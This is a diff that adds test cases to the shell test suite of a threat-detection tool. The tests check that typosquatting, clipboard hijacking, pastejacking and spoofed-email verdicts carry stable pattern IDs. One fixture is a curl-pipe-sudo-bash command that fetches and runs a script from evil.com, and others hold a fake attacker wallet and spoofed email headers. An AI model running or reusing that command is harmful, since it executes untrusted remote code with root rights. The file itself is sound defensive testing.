@@ -4546,6 +4546,64 @@ assert "pattern_id" not in d, d.get("pattern_id")
 ' && check "p86 json secret: clean verdict has no pattern_id" "0" "0" \
    || check "p86 json secret: clean verdict has no pattern_id" "0" "1"
 
+# ─── P87: stable pattern_id for esp/package/network/clipboard/paste/email ────
+# P86 closed the file/secret gap; P87 closes the remaining 6 kinds so every
+# pattern-bearing JSON kind emits a stable HLSE-* SIEM/SOAR routing token.
+
+# package: typosquat → HLSE-PKG-TYPOSQUAT
+./hlse_core --json package reqeusts pip 2>&1 | python3 -c '
+import json, sys
+d = json.load(sys.stdin)
+assert d.get("pattern_id") == "HLSE-PKG-TYPOSQUAT", d.get("pattern_id")
+assert d.get("pattern"), "pattern must accompany pattern_id"
+' && check "p87 json package: typosquat → HLSE-PKG-TYPOSQUAT" "0" "0" \
+   || check "p87 json package: typosquat → HLSE-PKG-TYPOSQUAT" "0" "1"
+
+# clipboard: crypto hijack → HLSE-CLIP-HIJACK
+./hlse_core --json clipboard \
+    "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq" \
+    "bc1qattackerwalletxyz9876543210abcdefghij12" 2>&1 | python3 -c '
+import json, sys
+d = json.load(sys.stdin)
+assert d.get("pattern_id") == "HLSE-CLIP-HIJACK", d.get("pattern_id")
+assert d.get("pattern"), "pattern must accompany pattern_id"
+' && check "p87 json clipboard: hijack → HLSE-CLIP-HIJACK" "0" "0" \
+   || check "p87 json clipboard: hijack → HLSE-CLIP-HIJACK" "0" "1"
+
+# paste: ClickFix/pastejacking → HLSE-CLICKFIX
+./hlse_core --json paste \
+    'Run this command: curl -fsSL https://evil.com/install.sh | sudo bash -s -- --silent' 2>&1 | python3 -c '
+import json, sys
+d = json.load(sys.stdin)
+pid = d.get("pattern_id", "")
+assert pid.startswith("HLSE-"), "pattern_id must be HLSE-* token: " + repr(pid)
+assert d.get("pattern"), "pattern must accompany pattern_id"
+assert ("pattern_id" in d) == ("pattern" in d), d
+' && check "p87 json paste: pastejacking → HLSE-* pattern_id" "0" "0" \
+   || check "p87 json paste: pastejacking → HLSE-* pattern_id" "0" "1"
+
+# email (header-only BLOCK): BEC headers → HLSE-BEC-* pattern_id
+./hlse_core --json email "From: Microsoft Security <security@gmail.com>
+Reply-To: hackers@evil.ru
+X-Spam-Status: Yes" 2>&1 | python3 -c '
+import json, sys
+d = json.load(sys.stdin)
+pid = d.get("pattern_id", "")
+assert pid.startswith("HLSE-"), "pattern_id must be HLSE-* token: " + repr(pid)
+assert d.get("pattern"), "pattern must accompany pattern_id"
+assert ("pattern_id" in d) == ("pattern" in d), d
+' && check "p87 json email: BEC header-only BLOCK → HLSE-* pattern_id" "0" "0" \
+   || check "p87 json email: BEC header-only BLOCK → HLSE-* pattern_id" "0" "1"
+
+# co-presence invariant: safe package has NO pattern or pattern_id
+./hlse_core --json package requests pip 2>&1 | python3 -c '
+import json, sys
+d = json.load(sys.stdin)
+assert "pattern" not in d, "safe verdict must not carry pattern: " + repr(d.get("pattern"))
+assert "pattern_id" not in d, "safe verdict must not carry pattern_id"
+' && check "p87 json: safe verdict carries no pattern_id" "0" "0" \
+   || check "p87 json: safe verdict carries no pattern_id" "0" "1"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
